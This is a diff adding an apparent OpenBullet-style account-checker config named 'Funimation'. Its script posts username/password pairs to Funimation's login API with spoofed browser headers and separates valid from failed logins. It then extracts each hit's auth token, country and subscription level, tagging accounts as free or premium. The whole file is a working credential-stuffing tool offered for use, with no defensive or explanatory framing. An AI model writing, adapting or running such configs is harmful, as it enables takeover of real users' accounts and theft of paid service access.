@@ -1,0 +1,80 @@
+[SETTINGS]
+{
+  "Name": "Funimation",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-02-22T02:32:40.0688019-05:00",
+  "AdditionalInfo": "",
+  "Author": "",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://prod-api-funimationnow.dadcdigital.com/api/auth/login/" 
+  CONTENT "username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 OPR/66.0.3515.111" 
+  HEADER "accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "origin: https://www.funimation.com" 
+  HEADER "referer: https://www.funimation.com/log-in/" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "user\":{\"id\":" 
+    KEY "{\"token\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "{\"success\":false,\"error\":\"Failed Authentication.\"}" 
+    KEY "Failed Authentication" 
+
+PARSE "<SOURCE>" LR "{\"token\":\"" "\"," -> VAR "Token" 
+
+PARSE "<SOURCE>" LR "user_region\":\"" "\"}" CreateEmpty=FALSE -> CAP "Country" 
+
+PARSE "<SOURCE>" LR "en:web:us_" "\"," CreateEmpty=FALSE -> CAP "Subscription" 
+
+KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<Subscription>" Contains "free" 
+  KEYCHAIN Success OR 
+    KEY "premium" 
+
